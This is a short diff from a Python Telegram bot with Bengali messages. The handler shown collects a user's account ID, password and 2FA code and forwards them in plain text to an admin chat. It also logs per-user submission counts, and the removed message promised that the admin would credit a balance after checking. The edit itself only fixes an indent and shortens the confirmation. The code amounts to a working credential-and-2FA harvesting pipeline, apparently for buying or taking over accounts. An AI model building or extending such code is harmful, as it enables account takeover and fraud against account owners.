@@ -158,14 +158,14 @@ async def get_2fa(message: types.Message, state: FSMContext):
                  f"🆔 **ID:** `{data.get('u_id')}`\n"
                  f"🔑 **Pass:** `{data.get('u_pass')}`\n"
                  f"🔐 **2FA:** `{message.text}`")
-       import datetime
+    import datetime
     today = datetime.date.today().strftime("%Y-%m-%d")
     cursor.execute("INSERT OR IGNORE INTO stats (user_id, date) VALUES (?, ?)", (message.from_user.id, today))
     cursor.execute("UPDATE stats SET single_id_count = single_id_count + 1 WHERE user_id=? AND date=?", (message.from_user.id, today))
     db.commit()
 
     await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
-    await message.answer("✅ আপনার তথ্যগুলো সফলভাবে জমা হয়েছে। এডমিন চেক করে ব্যালেন্স দিয়ে দিবে।", reply_markup=main_menu())
+    await message.answer("✅ আপনার তথ্য জমা হয়েছে।")
     await state.finish()
     
 # ৩. রিফ্রেশ বাটনের লজিক (state="*" যোগ করা হয়েছে যাতে যেকোনো অবস্থায় এটি কাজ করে)
